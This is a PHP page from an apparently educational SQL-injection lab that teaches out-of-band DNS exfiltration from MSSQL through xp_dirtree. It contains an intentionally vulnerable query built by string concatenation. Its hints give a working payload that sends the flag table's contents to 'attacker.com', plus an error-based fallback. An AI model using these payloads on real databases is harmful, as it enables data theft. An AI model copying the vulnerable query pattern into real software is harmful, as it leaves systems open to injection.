<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab11_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab11", $mode, $_GET['ref'] ?? ''));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        $verify_error = "Database connection failed. Is the MSSQL container running?";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 11. OOB: xp_dirtree DNS Exfiltration</h3>

    <h4>Scenario</h4>
    <p>
        A ticket system searches for issues by keyword. The page <strong>always</strong>
        returns "Search complete" regardless of results. There is no error output,
        no boolean signal, and response time is constant (WAITFOR is blocked).
    </p>
    <p>
        However, the MSSQL server can make <strong>outbound network connections</strong>.
        MSSQL's <code>xp_dirtree</code>, <code>xp_fileexist</code>, and
        <code>xp_subdirs</code> extended procedures accept UNC paths, which trigger
        <strong>DNS lookups</strong> and <strong>SMB connections</strong> to attacker-controlled servers.
    </p>

    <h4>Objective</h4>
    <p>
        The flag is in the <code>flags</code> table. Since there is no direct output channel,
        use <strong>Out-of-Band (OOB) DNS exfiltration</strong> via <code>xp_dirtree</code>
        to leak it. For the lab, error-based extraction is also available as a fallback.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. No output, no errors shown, WAITFOR blocked: only OOB remains.<br>
        2. DNS exfil: <code>'; DECLARE @d VARCHAR(100); SELECT @d=(SELECT TOP 1 flag FROM flags); EXEC('xp_dirtree "\\' + @d + '.attacker.com\x"'); -- -</code><br>
        3. Monitor DNS on your server: <code>sudo tcpdump -i eth0 port 53</code><br>
        4. The DNS query will contain the flag as a subdomain.<br>
        5. Fallback: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab11_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You extracted the flag using OOB DNS exfiltration via xp_dirtree on MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Ticket Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="q" class="input" placeholder="Search tickets (try: bug)" value="<?= htmlspecialchars($_POST['q'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['q'])) {
    $q = $_POST['q'];

    // Block WAITFOR to force OOB technique
    if (stripos($q, 'waitfor') !== false) {
        echo '<div class="result-error result-box"><strong>Blocked keyword detected.</strong></div>';
    } else {
        // INTENTIONALLY VULNERABLE: direct string concatenation
        $query = "SELECT * FROM tickets WHERE title LIKE '%$q%'";

        // Show the executed query in a terminal block
        echo '<div class="terminal query-output">';
        echo '  <div class="terminal-header">';
        echo '    <span class="terminal-dot red"></span>';
        echo '    <span class="terminal-dot yellow"></span>';
        echo '    <span class="terminal-dot green"></span>';
        echo '    <span class="terminal-title">MSSQL Query</span>';
        echo '  </div>';
        echo '  <div class="terminal-body" data-highlight="sql">';
        echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
        echo '  </div>';
        echo '</div>';

        // Execute: suppress everything, always same response
        if ($conn) {
            try {
                $conn->query($query);
            } catch (PDOException $e) {
                // In a real OOB scenario, errors would be hidden too
                // For the lab, we show errors as a fallback extraction channel
                echo '<div class="result-error result-box">';
                echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
                echo '</div>';
            }
        }

        echo '<div class="result-data result-box"><strong>Search complete.</strong></div>';
    }
}
?>

<?php endif; ?>
